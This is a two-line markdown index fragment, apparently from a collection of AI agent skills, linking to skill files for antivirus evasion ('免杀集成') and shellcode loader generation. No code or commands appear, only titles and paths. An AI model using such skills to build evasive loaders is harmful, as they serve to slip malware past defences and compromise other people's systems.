- **免杀集成** → `/skills/evasion/evasion-technique-integrate/SKILL.md`
- **Shellcode Loader** → `/skills/evasion/shellcode-loader-generate/SKILL.md`
